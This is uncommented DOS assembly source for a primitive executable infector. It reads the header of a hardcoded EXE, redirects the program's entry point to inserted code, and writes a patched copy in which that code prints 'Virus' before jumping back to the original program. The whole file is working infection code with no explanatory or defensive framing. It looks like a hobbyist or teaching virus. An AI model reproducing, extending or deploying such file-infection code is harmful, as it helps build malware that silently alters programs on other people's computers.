code		segment
	assume cs:code,ds:code
	org 100h
start:
	mov ax,offset iniz
	push ax
	ret
hand:	dw 0
outhh:	dw 0
nomefile: db "c:\bc\exe.exe",0
outfile:  db "c:\bc\pexe.exe",0
vv:	dw 0
buff:	db 570 dup(0)
phlung:	dw 0
iniz:
	lea ax,endmycode
	lea dx,mycode
	sub ax,dx
	xor dx,dx
	mov bx,10h
	div bx
	cmp dx,0
	je nn
	inc ax
nn:	mov word ptr phlung,ax


	mov ah,3dh
	mov al,2
	lea dx,nomefile
	int 21h
	mov word ptr hand,ax

	mov ah,3ch
	lea dx,outfile
	xor cx,cx
	int 21h
	mov word ptr outhh,ax

	mov ah,3fh
	mov bx,word ptr hand
	mov cx,512
	lea dx,buff
	int 21h

	lea bx,buff
	add bx,14h
	mov ax,[bx]
	mov word ptr old_ip,ax
	xor ax,ax
	mov [bx],ax
	inc bx
	inc bx
	mov ax,[bx]
	mov cx,word ptr phlung
	add ax,cx
	mov word ptr old_cs,ax
	xor ax,ax
	mov [bx],ax


	mov ah,40h
	mov bx,word ptr outhh
	mov cx,512
	lea dx,buff
	int 21h

	mov ax,word ptr phlung
	xor dx,dx
	mov bx,10h
	mul bx
	mov cx,ax
	mov ah,40h
	mov bx,word ptr outhh
	lea dx,mycode
	int 21h

cic:
	mov ah,3fh
	mov bx,word ptr hand
	mov cx,1
	lea dx,buff
	int 21h
	mov word ptr vv,ax

	mov ah,40h
	mov bx,word ptr outhh
	mov cx,1
	lea dx,buff
	int 21h
	mov ax,word ptr vv
	cmp ax,1
	je cic

	mov ah,3eh
	mov bx,word ptr outhh
	int 21h

	mov ah,3eh
	mov bx,word ptr hand
	int 21h



	int 20h


mycode: push ds
	push cs
	pop ds
	push cs
	pop dx
	lea bx,old_cs
	lea cx,mycode
	sub bx,cx
	mov ax,[bx]
	add ax,dx
	mov [bx],ax
	mov ah,9
	mov dx,offset msg
	mov cx,offset mycode
	sub dx,cx
	int 21h
	pop ds
	db 0eah
old_ip:	dw 0
old_cs:	dw 0
msg:	db'Virus',13,10,'$'
endmycode:	db 20 dup(0)
code		ends
	end start
